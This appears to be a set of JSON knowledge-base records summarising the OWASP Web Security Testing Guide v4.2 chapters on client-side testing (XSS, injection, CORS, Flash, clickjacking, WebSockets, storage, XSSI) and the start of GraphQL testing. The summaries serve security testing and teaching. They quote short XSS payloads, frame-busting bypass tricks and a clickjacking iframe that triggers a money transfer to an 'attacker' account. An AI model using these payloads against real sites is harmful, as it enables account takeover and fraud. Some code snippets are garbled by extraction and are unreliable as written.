{"id": "WSTGv4_2-00153", "source": "wstg-v4.2_knowledge.json", "start_item": 2608, "end_item": 2622, "text": "nce of secure client-side interactions.\nWebSockets and Web Messaging are new communication protocols that also require specific security testing measures.\nBrowser Storage mechanisms should be tested to ensure sensitive data is not improperly exposed.\nDOM-Based Cross Site Scripting (XSS) occurs when JavaScript on a page obtains user input and executes injected code.\nThe Document Object Model (DOM) represents documents in a browser and allows dynamic scripts to reference document components.\nUnlike other XSS types, DOM-based XSS can exploit poor JavaScript practices to execute attacks without server knowledge.\nIn DOM-based XSS, code executed is directed by the DOM rather than being solely reliant on server responses, making detection harder.\nA hypothetical example showcases how an attacker can execute a script directly in the user's browser using URL fragments instead of server requests.\nThe consequences of DOM-based XSS can include cookie theft and further malicious injections, necessitating similar mitigation strategies to other XSS types.\nJavaScript applications can differ from other applications as they are often dynamically generated by the server.\nCrawling the website is essential to identify all instances of JavaScript execution and inputs accepted.\nTop-down testing is sometimes preferred because many bottom-level functions may never be utilized, making bottom-up analysis inefficient.\nUser input in web applications can come from server-generated content or client-side JavaScript objects.\nExample of server-inserted JavaScript input: `var data = \"<escaped data from the server>\";`\nExample of client-side JavaScript object input: `var data = window.location;`\nWhen input is received from the server, the server can apply various permutations, whereas client-side inputs are governed by browser encoding rules.\nJavaScript can be executed outside of `<script>` blocks, including event handlers and CSS blocks with expression attributes.\nAutomated testing has limited success in detecting DOM-based XSS as it generally relies on server responses to identify attacks."}
{"id": "WSTGv4_2-00154", "source": "wstg-v4.2_knowledge.json", "start_item": 2623, "end_item": 2638, "text": "aScript can be executed outside of `<script>` blocks, including event handlers and CSS blocks with expression attributes.\nAutomated testing has limited success in detecting DOM-based XSS as it generally relies on server responses to identify attacks.\nThe code snippet provided demonstrates a way to identify the user's browser type using JavaScript and write a message to the document based on that.\nAutomated testing tools often miss vulnerabilities related to DOM-based XSS unless they can conduct deeper analysis of client-side code.\nManual testing is necessary for detecting DOM-based XSS vulnerabilities by reviewing the code for vulnerable parameters and dynamic code execution.\nThe text suggests referring to the DOM-based XSS Prevention Cheat Sheet for specific measures to mitigate this vulnerability.\nJavaScript injection vulnerability is a subtype of cross site scripting (XSS).\nThis vulnerability allows arbitrary JavaScript code to be executed in the victim’s browser.\nConsequences of JavaScript injection can include disclosing session cookies or modifying page content.\nJavaScript injection vulnerabilities occur due to lack of proper user input and output validation.\nAn example of a dangerous JavaScript code allowing injection via the query string is provided: `var rr = location.search.substring(1);`\nAn attacker could exploit this by using a crafted URL like `www.victim.com/?javascript:alert(1)`.\nTest objectives include identifying sinks and possible JavaScript injection points.\nAn example of code that uses `eval()` which is potentially vulnerable to injection is provided, illustrating the risks associated with handling user input.\nThe code snippet demonstrates a vulnerability that allows an attacker to control the `location.hash`, which can lead to injecting malicious JavaScript.\nThe injected JavaScript code can manipulate or take control of the user’s browser, indicating a security risk in web applications.\nHTML injection is a type of injection vulnerability that allows an attacker to inject arbitrary HTML code into a vulnerable web page.\nConsequences of HTML injection include disclosure of session cookies and modification of page content seen by victims."}
{"id": "WSTGv4_2-00155", "source": "wstg-v4.2_knowledge.json", "start_item": 2639, "end_item": 2660, "text": "ML injection is a type of injection vulnerability that allows an attacker to inject arbitrary HTML code into a vulnerable web page.\nConsequences of HTML injection include disclosure of session cookies and modification of page content seen by victims.\nThe vulnerability arises when user input is not sanitized and output is not encoded.\nMalicious HTML can be injected using methods like innerHTML and document.write().\nExamples of vulnerable code snippets were provided to illustrate the risks associated with unsanitized user input.\nAn example of an exploit using HTML injection was shown: `http://vulnerable.site/page.html?user=<img%20src='aaa'%20onerror=alert(1)>` which executes arbitrary JavaScript.\nThis page refers to a DOM XSS (Cross-Site Scripting) exercise found at a specific URL.\nThe code example includes a script that manipulates the DOM based on the URL hash.\nIt demonstrates how to set a message in a div element when the hash changes in the address bar using jQuery.\nThe injected HTML can lead to security vulnerabilities if proper validation is not performed.\nDescription of client-side URL redirection and its risks.\nDefinition of open redirection as an input validation flaw.\nExplanation of how untrusted input can lead to malicious URL redirection.\nExample of a phishing attack URL.\nPotential consequences of open redirection, including phishing scams.\nTest objectives for identifying injection points handling URLs or paths.\nManual testing process for detecting client-side redirections, with JavaScript example.\nDemonstration of a JavaScript snippet that exemplifies a redirection vulnerability.\nThe page discusses web security testing methodologies.\nIt highlights a vulnerability that can arise from improper handling of URL hash fragments.\nExample code provided demonstrates how JavaScript injection can be executed.\nThe snippet includes a method for redirecting users using the location hash, which can be exploited.\nAn example query string is given to demonstrate a potential exploit with JavaScript alert.\nDifferent browsers may treat certain characters differently, which is important when testing for such vulnerabilities."}
{"id": "WSTGv4_2-00156", "source": "wstg-v4.2_knowledge.json", "start_item": 2661, "end_item": 2678, "text": "e location hash, which can be exploited.\nAn example query string is given to demonstrate a potential exploit with JavaScript alert.\nDifferent browsers may treat certain characters differently, which is important when testing for such vulnerabilities.\nCSS Injection vulnerability allows injection of arbitrary CSS code on trusted sites, potentially leading to XSS or data exfiltration.\nUser-supplied CSS can interfere with legitimate styles, providing attackers a way to execute JavaScript or extract sensitive data.\nVulnerability in examples shows how CSS can manipulate styles of elements based on user input, demonstrating risks in older browsers.\nHTML and JavaScript examples illustrate how attackers can alter styles and leverage URL fragments to exploit vulnerabilities.\nAttack scenarios can include using CSS selectors to exfiltrate data, such as CSRF tokens, through brute-force techniques.\nWeb Security Testing Guide focuses on identifying and assessing CSS injection points.\nTest objectives include identifying the injection points and assessing their impact.\nCode analysis is necessary to determine if a user can inject content in the CSS context.\nExample code is provided demonstrating how an attacker can manipulate the style attribute using user-controlled input.\nKey point about the variability of results based on browser and payload supplied.\nOther attacks related to CSS injections and resources on prevention are mentioned.\nClient-side resource manipulation vulnerabilities occur due to input validation flaws.\nThey allow an attacker to control resource paths such as iframes, JavaScript, or XMLHttpRequests.\nThese vulnerabilities can facilitate XSS attacks by loading malicious resources.\nExample of vulnerable JavaScript code that allows control over the URL leading to potential XSS.\nAn attacker can exploit such vulnerability by manipulating the URL, leading to the execution of malicious scripts.\nCORS requests can also be manipulated through client-side resource manipulation, allowing loading of malicious content.\nWeb Security Testing Guide v4.2 discusses methods for identifying input validation vulnerabilities in web applications."}
{"id": "WSTGv4_2-00157", "source": "wstg-v4.2_knowledge.json", "start_item": 2679, "end_item": 2692, "text": "s scripts.\nCORS requests can also be manipulated through client-side resource manipulation, allowing loading of malicious content.\nWeb Security Testing Guide v4.2 discusses methods for identifying input validation vulnerabilities in web applications.\nPayload examples demonstrate how manipulated input can be leveraged to exploit XSS vulnerabilities.\nIdentifying sinks with weak input validation is crucial for assessing the potential impact of resource manipulation.\nSpecific code snippets are provided to illustrate how user-controlled inputs can request external resources, leading to security risks.\nThe guide outlines a structured approach to testing for vulnerabilities, including checking various resource types like iframes, links, AJAX requests, and more.\nCross-Origin Resource Sharing (CORS) is a mechanism that allows web browsers to perform cross-domain requests in a controlled manner.\nPreviously, XMLHttpRequest Level 1 (L1) API restricted requests to the same origin due to the same origin policy.\nCORS involves using HTTP headers to determine if a cross-origin request is permitted.\nThe W3C CORS specification requires a pre-flight OPTIONS request for non-simple requests to check server permissions and credentials usage.\nThe 'origin' header in CORS requests indicates the domain of the request initiator, but it cannot be manipulated by JavaScript.\nRelying solely on the 'origin' header for access control is insecure, as it can be spoofed and application-level protections are necessary.\nThe 'Access-Control-Allow-Origin' response header designates which domains can access the response data, and insecure configurations (e.g., using '*' as value) can lead to vulnerabilities.\nPenetration testing should focus on identifying insecure CORS configurations that may expose sensitive data.\nXMLHttpRequest L2 (XHR L2) allows cross-domain requests, introducing potential security vulnerabilities that were absent in XMLHttpRequest L1.\nKey exploits include passing unvalidated URLs to XMLHttpRequest, especially if absolute URLs are permitted, raising the risk of code injection."}
{"id": "WSTGv4_2-00158", "source": "wstg-v4.2_knowledge.json", "start_item": 2693, "end_item": 2706, "text": "oss-domain requests, introducing potential security vulnerabilities that were absent in XMLHttpRequest L1.\nKey exploits include passing unvalidated URLs to XMLHttpRequest, especially if absolute URLs are permitted, raising the risk of code injection.\nOther relevant headers in CORS include Access-Control-Max-Age and Access-Control-Expose-Headers, which are specified in the CORS W3C document.\nTesting objectives for CORS involve identifying endpoints that implement CORS and ensuring the CORS configuration is secure or harmless.\nTesting tools like ZAP can intercept HTTP headers to reveal how CORS is implemented, with a need for manual inspection of JavaScript to identify code injection vulnerabilities.\nExample of insecure response: using wildcard '*' in the Access-Control-Allow-Origin header can lead to security risks.\nDemonstrated examples of XSS and CORS vulnerabilities include improperly validating input in XMLHttpRequests, which may allow responses to inject executable scripts.\nThe code examples demonstrate how to manipulate the URL to potentially include a harmful script through the use of hash fragments.\nThe example highlights a vulnerability in the web application due to lack of URL validation, allowing for remote script injection.\nThe HTTP requests and responses are analyzed, showing how the original request is formed and how the malicious request can be structured.\nAccess-Control-Allow-Origin: * is highlighted as a part of the response that can facilitate the execution of the injected script from an attacker-controlled domain.\nCross-Site Flashing (XSF) is a vulnerability similar to XSS and occurs when different domains interact through Flash movies.\nActionScript is based on ECMAScript and has three versions: ActionScript 1.0, 2.0, and 3.0, with 3.0 being a complete rewrite for object-oriented design.\nFlawed Flash applications can lead to security issues such as DOM-based Cross Site Scripting (DOM XSS).\nXSF may occur when a movie loads another movie and can access the same sandbox, causing security vulnerabilities.\nFlash applications can navigate browsers, potentially creating open redirectors that are exploited in phishing attacks."}
{"id": "WSTGv4_2-00159", "source": "wstg-v4.2_knowledge.json", "start_item": 2707, "end_item": 2723, "text": "pting (DOM XSS).\nXSF may occur when a movie loads another movie and can access the same sandbox, causing security vulnerabilities.\nFlash applications can navigate browsers, potentially creating open redirectors that are exploited in phishing attacks.\nAn example of how a trusted site can be misused is demonstrated with a SWF redirecting to a malicious URL using getURLValue.\nPhishing attacks can leverage the trust users have in legitimate domains to direct them to malicious sites.\nDevelopers should avoid using full URLs as FlashVars to prevent open redirect vulnerabilities, preferring relative URLs or validating input domains.\nSince May 2007, Adobe has released new Flash Player versions that have made incremental security improvements to limit exploitability of attacks.\nSWFs can be decompiled for security testing purposes using tools like Flare, allowing for a detailed examination of Flash application code.\nFlashVars are used to pass variables to SWF files from the host web page, and they can contain critical data needed for the application's functionality.\nThe page discusses web security testing related to FlashVars in ActionScript 2.0 and 3.0.\nDevelopers must explicitly assign FlashVar values to local variables in ActionScript 3.0.\nIn ActionScript 2.0, uninitialized global variables are assumed to be FlashVars, which can lead to security issues.\nFlashVars can be exploited as a vector of attack, potentially leading to vulnerabilities in the code.\nAn example of vulnerable code is provided, illustrating how an attacker can manipulate FlashVars to execute malicious actions.\nThe page lists unsafe methods that could lead to vulnerabilities when user input is involved: loadVariables(), loadMovie(), and getURL().\nKey functions related to loading content in ActionScript: loadMovie(), loadMovieNum(), and others.\nUse of LoadVars for sending data and loading content.\nExample code snippets demonstrating loading sounds and playing video streams:\n```code Sound.loadSound( 'url' , isStreaming ); ``` ```code NetStream.play( 'url' ); ```\nDescription of exploitation via reflected XSS with SWF files, including code for creating an iframe to load a SWF file."}
{"id": "WSTGv4_2-00160", "source": "wstg-v4.2_knowledge.json", "start_item": 2724, "end_item": 2739, "text": "loading sounds and playing video streams:\n```code Sound.loadSound( 'url' , isStreaming ); ``` ```code NetStream.play( 'url' ); ```\nDescription of exploitation via reflected XSS with SWF files, including code for creating an iframe to load a SWF file.\nExplanation of GetURL (AS2) and NavigateToURL (AS3) with code examples showing how to load a URI into a browser using ActionScript:\n```code getURL(_root.URI,'_targetFrame'); ``` ```code var request:URLRequest = new URLRequest(FlashVarSuppliedURL); navigateToURL(request); ```\nIn-depth explanation of JavaScript injections using getURL function, including potential injection of JavaScript:\n```code http://victim/file.swf?URI=javascript:evilcode ``` ```code getURL('javascript:evilcode','_self'); ```\nDiscussion on `asfunction` protocol to execute ActionScript function instead of opening a URL, with limitations after Flash Player 9 r48.\nThe page discusses vulnerabilities related to web security testing, specifically focusing on Flash applications.\nUnsafe method examples include 'loadMovie(_root.URL)' and 'ExternalInterface.call'.\nThe potential abuse of 'ExternalInterface.call' is highlighted, particularly when its arguments can be controlled by an attacker.\nThe use of 'eval' with injected JavaScript code presents a security flaw.\nHTML Injection vulnerabilities are explained with an example of using TextField Objects to render HTML, which could allow for XSS attacks.\nExamples of attack patterns using HTML Injection include direct XSS links and function calling links, utilizing the <a> tag.\nImage tags can be employed in attacks, such as loading malicious SWF files.\nXSS vulnerability is not exploitable since the release of Flash Player 9.0.124.0 but GUI modifications can still be done.\nExample of XSS payload using SWF: ```< img src= 'javascript:evilcode//.swf' >```\nTools for working with SWF include: Adobe SWF Investigator, OWASP SWFIntruder, Flare (Decompiler), Flasm (Disassembler), and Swfmill (convert SWF to XML and vice versa).\nClickjacking is a malicious technique where a user is misled into clicking on something different from what they believe they are clicking on."}
{"id": "WSTGv4_2-00161", "source": "wstg-v4.2_knowledge.json", "start_item": 2740, "end_item": 2756, "text": "ASP SWFIntruder, Flare (Decompiler), Flasm (Disassembler), and Swfmill (convert SWF to XML and vice versa).\nClickjacking is a malicious technique where a user is misled into clicking on something different from what they believe they are clicking on.\nIt can potentially send unauthorized commands or reveal confidential information while interacting with web pages.\nThe term clickjacking was first coined in 2008 by Jeremiah Grossman and Robert Hansen.\nA clickjacking attack manipulates HTML and JavaScript features to force a victim to perform unintended actions.\nThe attacker creates a page that loads the target application within an inline frame, often concealed with CSS.\nVictims need to be authenticated against the attacker’s target website for the attack to be effective.\nImage: img_page402_1.png\nDescription of clickjacking vulnerability and its implications for web security.\nThe potential for an attacker to deceive users into performing unintended actions through hidden elements.\nThe importance of testing for clickjacking vulnerabilities, especially with anti-CSRF protections in place.\nObjectives of testing include understanding and assessing security measures.\nInstructions for creating a test page to assess clickjacking vulnerabilities, including HTML code provided.\nImage: img_page403_1.png\nBypass Clickjacking Protection techniques help in identifying if a site is safeguarded against clickjacking, though it doesn't ensure complete immunity.\nMethods for clickjacking protection are summarized into principal mechanisms, but there are workarounds to bypass them.\nFrame Busting is a client-side technique developed to prevent a site from being framed, utilizing scripts to break the frame under certain conditions.\nFrame Busting code often uses conditional statements that check if the page is loaded in a frame and responds appropriately to prevent framing.\nThere is a misconception that mobile websites need less protection from clickjacking, but attackers can exploit mobile sites similarly to desktop sites, especially with unprotected alternatives."}
{"id": "WSTGv4_2-00162", "source": "wstg-v4.2_knowledge.json", "start_item": 2757, "end_item": 2775, "text": " a frame and responds appropriately to prevent framing.\nThere is a misconception that mobile websites need less protection from clickjacking, but attackers can exploit mobile sites similarly to desktop sites, especially with unprotected alternatives.\nDouble Framing involves nesting frames which can create security vulnerabilities, thwarting frame busting attempts due to browser policies against descendant frame navigation.\nKey example code snippet for target site frame busting: ```if (top.location!=self.location) { parent.location = self.location; }```\nAttacker’s tactics can involve using nested frames (double framing) to circumvent traditional frame busting defenses.\nThe use of iframes in web security testing and the implications for clickjacking.\nDisabling JavaScript as a method of bypassing client-side protections.\nUsage of the 'security' attribute in Internet Explorer to restrict frame functionalities:\n```code < iframe src= \"http://example.org\" security= \"restricted\" ></ iframe > ```\nApplication of the 'sandbox' attribute in HTML5 for iframe restrictions:\n```code < iframe src= \"http://example.org\" sandbox></ iframe > ```\nThe 'designMode' feature in browsers and its implications for security:\nThe onBeforeUnload event and its use in evading frame busting mechanisms.\nExample of canceling navigation via the onBeforeUnload event using JavaScript:\n```code < h1 >www.fictitious.site</ h1 > < script > window .onbeforeunload = | function () | { | return | \" Do you want to leave fictitious.site?\" ; | } | </ script > < iframe | src= \"http://example.org\" > ```\nMethod for an attacker to flood navigation requests via `HTTP/1.1 204 No Content` for evasion.\nWeb Security Testing Guide v4.2 discusses security measures against XSS attacks.\nAn example code snippet for HTTP response code 204 is shown:\nExample code for an attacker’s page illustrates how to use JavaScript to manipulate browser behavior.\nXSS filters were introduced in browsers like Google Chrome 4.0 and IE8 to mitigate reflected XSS attacks.\nThe IE8 XSS filter examines every request and response and disables inline scripts if it detects possible XSS attempts."}
{"id": "WSTGv4_2-00163", "source": "wstg-v4.2_knowledge.json", "start_item": 2776, "end_item": 2793, "text": "pulate browser behavior.\nXSS filters were introduced in browsers like Google Chrome 4.0 and IE8 to mitigate reflected XSS attacks.\nThe IE8 XSS filter examines every request and response and disables inline scripts if it detects possible XSS attempts.\nAn example of frame busting code is provided to demonstrate how attackers can exploit XSS filters.\nChrome 4.0 XSSAuditor filter behaves differently, allowing attackers to deactivate specific scripts by manipulating request parameters.\nWeb Security Testing Guide v4.2 includes examples of frame busting code in JavaScript.\nFrame busting code can be bypassed in certain versions of Internet Explorer and Safari by redefining the 'location' attribute.\nIn IE7 and IE8, redefining 'location' as a variable prevents reading or navigating using 'top.location'.\nExample for IE: `var location = 'xyz';`\nIn Safari 4.0.4, an attacker can use 'defineSetter' to bind 'location' to a function, which can block frame navigation attempts.\nExample for Safari: `window.defineSetter('location', function(){});`\nThe 'X-FRAME-OPTIONS' HTTP header is a server-side protection method against clickjacking, which can be set to DENY, SAMEORIGIN, or ALLOW-FROM origin.\nThe recommended value for 'X-FRAME-OPTIONS' is DENY, but it has compatibility issues with older browsers.\nWeb proxies can alter HTTP headers, which may impact site security features like 'X-FRAME-OPTIONS'.\nDevelopers must implement the 'X-FRAME-OPTIONS' header on every page to ensure protection against clickjacking, including on mobile site versions.\nA proof of concept (PoC) is necessary to demonstrate vulnerabilities such as clickjacking.\nClickjacking can combine with other attack types like CSRF, potentially bypassing anti-CSRF measures.\nIn an example payment system, users must confirm transfers, and the process involves generating and validating a CSRF token.\nCode snippets showcase how to generate a random anti-CSRF token and set it in the session data.\nExample HTML form code illustrates how hidden fields are used to carry sensitive information during transfer confirmation.\nImage: img_page408_1.png"}
{"id": "WSTGv4_2-00164", "source": "wstg-v4.2_knowledge.json", "start_item": 2794, "end_item": 2807, "text": "token.\nCode snippets showcase how to generate a random anti-CSRF token and set it in the session data.\nExample HTML form code illustrates how hidden fields are used to carry sensitive information during transfer confirmation.\nImage: img_page408_1.png\nThe page presents security code snippets related to web security testing, particularly focusing on anti-CSRF (Cross-Site Request Forgery) protection.\nThe code checks that anti-CSRF tokens are present and correct to facilitate a secure money transfer operation, protecting against CSRF attacks.\nAn example code is provided which illustrates checks against the anti-CSRF token to ensure a secure transaction.\nWarning is provided about potential security vulnerabilities when input sanitization is neglected, specifically mentioning CSRF and Clickjacking attacks.\nThe attacker could exploit the security flaw by using the GET method to manipulate transfer parameters if security measures are only applied in the last step of a transaction process.\nA reference to an advanced clickjacking attack that can trick users into submitting forms is included, highlighting the importance of comprehensive security measures.\nImage: img_page409_1.png\nFigure 4.11.9-5 illustrates an example of a Clickjacking malicious page.\nThe provided HTML code snippet demonstrates how to construct a Clickjacking page using specific styling and positioning methods to obscure malicious content.\nKey CSS styles are utilized, such as setting opacity to zero to make the overlay element invisible while still capturing user interactions.\nImage: img_page410_1.png\nExample of a form used in web security testing for potential clickjacking attacks.\nHTML code showing a form action and a button for submission: ```code | < form | action= \"http://www.owasp.com\" > | | < input | type= \"submit\" | class= \"button\" | value= \"Click and go!\" > | | </ form > | | </ div > | ```\nHTML code for an iframe that could be utilized for clickjacking: ```code | < iframe | id= \"clickjacking\" -src= \"http//localhost/csrf/transferphp? | | account=attacker&amount=10000\" -width= \"500\" -height= \"500\" -scrolling= \"no\" -frameborder= \"none\" > | | </ iframe > | | </ body > | | </ html > | ```"}
{"id": "WSTGv4_2-00165", "source": "wstg-v4.2_knowledge.json", "start_item": 2808, "end_item": 2825, "text": "r clickjacking: ```code | < iframe | id= \"clickjacking\" -src= \"http//localhost/csrf/transferphp? | | account=attacker&amount=10000\" -width= \"500\" -height= \"500\" -scrolling= \"no\" -frameborder= \"none\" > | | </ iframe > | | </ body > | | </ html > | ```\nDescription of a clickjacking technique that involves masking an iframe underneath a legitimate button to deceive a user into submitting a form.\nFigure 4.11.9-6 illustrates a clickjacking example, suggesting that advanced techniques can further manipulate user inputs.\nImage: img_page411_1.png\nTesting WebSockets fall under the ID WSTG-CLNT-10 of the Web Security Testing Guide v4.2.\nWebSockets allow full-duplex communication between the client and server, enabling true asynchronous communication unlike traditional HTTP.\nThe initial handshake for establishing a WebSocket connection occurs over HTTP, after which communication proceeds via TCP using frames.\nIt is crucial for servers to validate the Origin header during the WebSocket handshake to prevent CSRF-like vulnerabilities.\nWebSockets may operate over unencrypted TCP (using ws://) or encrypted TLS (using wss://) protocols, with default ports 80 and 443 respectively.\nData from untrusted sources must be sanitized and encoded to prevent injections and XSS attacks.\nKey test objectives include identifying WebSocket usage and assessing its implementation against standard HTTP tests.\nBlack-box testing for WebSockets involves checking if WebSocket connections are established, inspecting the Origin header, and ensuring SSL is used for sensitive data communication.\nCheck the SSL Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc).\nWebSockets do not handle authentication; normal black-box authentication tests should be conducted.\nWebSockets do not handle authorization; normal black-box authorization tests should be conducted.\nUse ZAP’s WebSocket tab to replay and fuzz WebSocket requests and responses.\nExample of using OWASP Zed Attack Proxy (ZAP) to intercept and manipulate WebSocket communications.\nVerify WebSocket handshake’s origin header when connecting to a remote WebSocket server.\nImage: img_page413_1.png"}
{"id": "WSTGv4_2-00166", "source": "wstg-v4.2_knowledge.json", "start_item": 2826, "end_item": 2842, "text": "zz WebSocket requests and responses.\nExample of using OWASP Zed Attack Proxy (ZAP) to intercept and manipulate WebSocket communications.\nVerify WebSocket handshake’s origin header when connecting to a remote WebSocket server.\nImage: img_page413_1.png\nGray-box testing allows for partial knowledge of the application, unlike black-box testing which has no prior knowledge.\nIn gray-box testing, the pen-tester may have API documentation that includes expected WebSocket request and responses.\nTools mentioned for WebSocket testing include OWASP Zed Attack Proxy (ZAP), WebSocket Client, and Google Chrome Simple WebSocket Client.\nReferences provided include notable resources about WebSockets from HTML5 Rocks, W3C, IETF, and several experts in the field.\nImage: img_page414_1.png\nWeb Messaging (Cross Document Messaging) allows applications from different domains to communicate securely.\nBefore web messaging, communication between different origins was restricted by the same origin policy enforced by browsers.\nCross Document Messaging was introduced to enable secure communication across iframes, tabs, and windows.\nThe postMessage() method is used for sending plain-text messages cross-origin.\nThe postMessage() method requires two parameters: the message and the target domain.\nSecurity concerns arise when using '*' as the domain in postMessage().\nTo receive messages, an event handler must be created that includes attributes for Data, Origin, and Source.\nThe origin consists of the scheme, host name, and port, ensuring the uniqueness of the originating domain.\nAssess the security of the message's origin by validating its input.\nTesters should check if application code filters and processes messages from trusted domains and ensures the receiving domain is explicitly stated.\nUsing wildcard (*) as the second argument of postMessage() can lead to security concerns and data leakage to malicious servers.\nFailing to restrict the domains or origins that can send messages creates security risks; testing must include examining the code for message event listeners and callback functions."}
{"id": "WSTGv4_2-00167", "source": "wstg-v4.2_knowledge.json", "start_item": 2843, "end_item": 2860, "text": "can lead to security concerns and data leakage to malicious servers.\nFailing to restrict the domains or origins that can send messages creates security risks; testing must include examining the code for message event listeners and callback functions.\nData must be treated as untrusted, regardless of the trusted domain it originates from, and should be processed with appropriate security controls.\nInsecure methods, such as eval() or innerHTML, can create DOM-based XSS vulnerabilities and should be avoided.\nJavaScript code should be analyzed to assess how web messaging is implemented, particularly in terms of domain restrictions and data handling.\nExample of an input validation vulnerability that may lead to XSS attacks\nUsage of `window.addEventListener` for message handling\nCode provided to show a callback function implementation\nImportance of using `innerText` over `innerHTML` for security reasons\nReference to further OWASP resources regarding web messaging, particularly the OWASP HTML5 Security Cheat Sheet\nBrowsers offer client-side storage mechanisms: Local Storage, Session Storage, IndexedDB, Web SQL (Deprecated), and Cookies.\nStorage mechanisms can be managed using developer tools like Google Chrome DevTools or Firefox’s Storage Inspector.\nSensitive data should not be stored in client-side storage; testing involves checking for injection vulnerabilities in code handling storage objects.\nLocal Storage persists even after the browser is closed, except in Private/Incognito mode; keys and values must be strings, utilizing JSON.stringify for non-string values.\nThe maximum storage capacity of localStorage varies by browser.\nTo list all key-value entries in localStorage, use the provided JavaScript code snippet.\nBoth keys and values in sessionStorage must be strings, non-string values should be converted using JSON.stringify.\nItems in sessionStorage are ephemeral and cleared when the browser tab/window is closed.\nThe maximum capacity of sessionStorage differs across browsers.\nIndexedDB is designed for structured data and can handle multiple object stores, allowing for complex objects beyond strings."}
{"id": "WSTGv4_2-00168", "source": "wstg-v4.2_knowledge.json", "start_item": 2861, "end_item": 2878, "text": "ephemeral and cleared when the browser tab/window is closed.\nThe maximum capacity of sessionStorage differs across browsers.\nIndexedDB is designed for structured data and can handle multiple object stores, allowing for complex objects beyond strings.\nObjects supported by the structured clone algorithm can be stored in IndexedDB, unlike Local/Session Storage.\nCryptoKeys, which are complex JavaScript objects, can be stored in IndexedDB but not in Local/Session Storage.\nW3C recommends storing persistent CryptoKeys in IndexedDB and suggests checking their extractable property during testing to ensure security.\nCode example provided for listing all key-value entries in sessionStorage.\nCode example for dumping contents of an IndexedDB database and all its object stores.\nWeb SQL is deprecated and should not be used by web developers.\nCookies are a key-value storage mechanism primarily used for session management and can store arbitrary string data.\nListing all cookies can be done using the code: ```console .log( window .document.cookie);```\nWeb developers can maintain global states by assigning custom attributes to the global window object, for example: ```window.MY_STATE = { counter: 0, flag: false };```\nData attached to the window object is lost when the page is refreshed or closed.\nTo list all entries on the Window object, a method involves creating an iframe to load a clean window object and compare properties.\nAn example of listing all properties on the window object includes the following code snippets:\n- Creating an iframe: ```const iframe = document.createElement('iframe');```\n- Getting properties: ```const currentWindow = Object.getOwnPropertyNames(window);```\n- Filtering properties: ```const results = currentWindow.filter(prop => !iframe.contentWindow.hasOwnProperty(prop));```\n- Logging different entries: ```results.forEach(key => console.log(` ${key} : ${ window[key]} `));```\nAttack chains can be formed, including client-side attacks, such as DOM-based XSS.\nBest practices recommend storing sensitive data on the server side instead of the client side."}
{"id": "WSTGv4_2-00169", "source": "wstg-v4.2_knowledge.json", "start_item": 2879, "end_item": 2892, "text": "```results.forEach(key => console.log(` ${key} : ${ window[key]} `));```\nAttack chains can be formed, including client-side attacks, such as DOM-based XSS.\nBest practices recommend storing sensitive data on the server side instead of the client side.\nDiscussion of various web storage technologies such as Session Storage, IndexedDB, Web Crypto API, Web SQL, and Cookies.\nReference to the OWASP Session Management Cheat Sheet for additional resources on HTML5 Web Storage API.\nCross Site Script Inclusion (XSSI) can lead to sensitive data leakage across-origin or cross-domain boundaries.\nXSSI is a client-side attack that utilizes JavaScript to leak sensitive data instead of executing state-changing actions like CSRF does.\nThe same-origin policy restricts web page access to only data from the same origin, but HTML <script> tag inclusions break this rule, enabling data leakage from third-party services.\nUsing XSSI, attackers can leak sensitive data such as authentication-related information and personal data.\nOlder browsers (IE9/10) had vulnerabilities that allowed data leakage via JavaScript error messages, but those have been patched.\nTo assess XSSI vulnerabilities, testers should locate sensitive data, determine if it can be leaked using JavaScript, analyze global variables, and check for specific responses like JSONP.\nTools like Burp proxy plugin can help in comparing authenticated and unauthenticated requests to identify dynamic responses.\nJavaScript runtime errors can be exploited.\nSensitive Data Leakage can occur via global variables, particularly when sensitive data like API keys are improperly stored in publicly accessible JavaScript files.\nExample provided shows how an attacker can use a script tag to access a victim's private JavaScript file and expose 'supersecretUserAPIkey' to the public.\nThe vulnerability is highlighted through a practical scenario involving social engineering to cause the victim to access the attacker's site, leading to data leakage.\nSensitive Data Leakage can also occur through the use of global function parameters, as demonstrated with an example where global JavaScript functions are manipulated to extract sensitive information."}
{"id": "WSTGv4_2-00170", "source": "wstg-v4.2_knowledge.json", "start_item": 2893, "end_item": 2915, "text": "ess the attacker's site, leading to data leakage.\nSensitive Data Leakage can also occur through the use of global function parameters, as demonstrated with an example where global JavaScript functions are manipulated to extract sensitive information.\nExample of HTML code displaying a function that leaks sensitive data.\nAttention to XSSI vulnerabilities that lead to data leakage via JavaScript.\nInjection of JavaScript code into CSV data as a method to leak information.\nExample HTTP response structure indicating CSV content disposition.\nSpecific CSV data format example indicating injection vulnerabilities.\nReference to previous work by Jeremiah Grossman on similar vulnerabilities.\nIllustration of leaking Gmail contacts through JavaScript manipulation.\nSensitive data leakage can occur via JavaScript runtime errors, particularly in IE9/10 due to additional details in error messages.\nExample of sensitive data leakage by serving CSV content at specific URIs for authenticated users:\nHTTP response example for sensitive CSV content with headers indicating successful data retrieval.\nAn example of how to exploit this vulnerability using an error handler in JavaScript:\nDynamic scoping of the `this` keyword in JavaScript can lead to data leakage, especially if an attacker overrides functions like Array.prototype.forEach.\nIllustration of data leakage through prototype chaining using the `this` keyword.\nImage: img_page425_1.jpeg\nPresentation of JavaScript code snippets that demonstrate how sensitive data can be leaked.\nExample of using the Array.prototype.forEach method to display secret values in an HTML element.\nHTML structure provided for displaying results with a div element.\nCode examples show threats related to insecure implementations in web security practices.\nIntroduction to API Testing\nFocus on GraphQL as a specific type of API\nVersion of the guide: v4.2\nGraphQL is popular for modern APIs due to its simplicity and ability to handle nested objects, though it introduces new attack surfaces.\nCommon attack vectors associated with GraphQL include Introspection Query and general API vulnerabilities like SQL injection."}
{"id": "WSTGv4_2-00171", "source": "wstg-v4.2_knowledge.json", "start_item": 2916, "end_item": 2930, "text": "opular for modern APIs due to its simplicity and ability to handle nested objects, though it introduces new attack surfaces.\nCommon attack vectors associated with GraphQL include Introspection Query and general API vulnerabilities like SQL injection.\nThe section outlines the testing objectives for a GraphQL application, which include ensuring a secure configuration, validating input fields against attacks, and proper access controls.\nIntrospection queries allow testers to determine what queries a GraphQL schema supports, which is critical for conducting security assessments.\nExample testing steps involve using native GraphQL introspection techniques to extract schema information, demonstrating the method with a code snippet.\nThe page contains code related to a web security testing framework.\nIt includes GraphQL fragments for types and input values, which are likely used for defining schema structures.\nThe code specifies various fields such as name, description, args, and interfaces within the GraphQL structure.\nThe content includes a GraphQL schema representation.\nThe schema has various types, such as queryType, mutationType, and subscriptionType.\nThere is an enumeration called __TypeKind which describes different type kinds in GraphQL: SCALAR, OBJECT, 